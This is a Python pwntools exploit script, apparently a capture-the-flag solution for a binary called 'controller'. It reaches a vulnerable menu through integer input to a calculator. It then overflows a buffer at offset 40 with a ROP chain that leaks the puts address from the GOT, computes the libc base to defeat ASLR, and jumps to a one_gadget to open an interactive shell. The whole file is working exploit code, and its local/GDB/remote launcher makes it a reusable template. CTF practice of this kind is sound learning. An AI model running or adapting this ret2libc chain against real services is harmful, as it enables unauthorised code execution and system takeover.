from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Perform subtraction of two negatives to get +65338
def calc(p):
    p.sendlineafter(': ', '-65338')
    p.sendline('-130676')
    p.sendlineafter('>', '2')


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './controller'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Swap between local and remote libc
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

# Generate 65338 in calculator
calc(io)

# Leak got.puts using ROP object
rop = ROP(elf)
rop.puts(elf.got.puts)
rop.calculator()

# Send the payload
io.sendlineafter('>', flat({offset: rop.chain()}))
io.recvline()

# Get our leaked got.write address and format it
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Set the libc_base_addr using the offsets
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Generate 65338 in calculator
calc(io)

# Send the payload - one_gadget
io.sendlineafter('>', flat({offset: libc.address + 0x4f3d5}))

# Got Shell?
io.interactive()
